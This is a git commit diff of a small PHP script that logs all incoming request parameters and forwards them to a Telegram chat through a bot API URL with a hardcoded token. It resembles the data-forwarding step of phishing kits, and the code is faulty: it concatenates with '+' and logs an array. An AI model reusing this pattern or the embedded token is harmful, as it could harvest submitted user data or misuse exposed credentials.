e8f17a4bfca4eddfea4f702d4e67b35e8914fed8
ducthangbui <ducthangbui1996@gmail.com>
2019-12-17 00:18:29 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,12 +1,13 @@
 <?php
    error_log(implode("|",$_REQUEST));
+   error_log($_GET);
    $data = implode("|",$_REQUEST);
     // Get cURL resource
 $curl = curl_init();
 // Set some options - we are passing in a useragent too here
 curl_setopt_array($curl, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'https://api.telegram.org/bot937782324:AAFxgtrxcMuHlMMMK0JmT8H8-RnqTwsz7JY/sendMessage?chat_id=-261885730&text=' + $data
+    CURLOPT_URL => 'https://api.telegram.org/bot937782324:AAFxgtrxcMuHlMMMK0JmT8H8-RnqTwsz7JY/sendMessage?chat_id=-261885730&text=' + $_GET
 ]);
 // Send the request & save response to $resp
 $resp = curl_exec($curl);
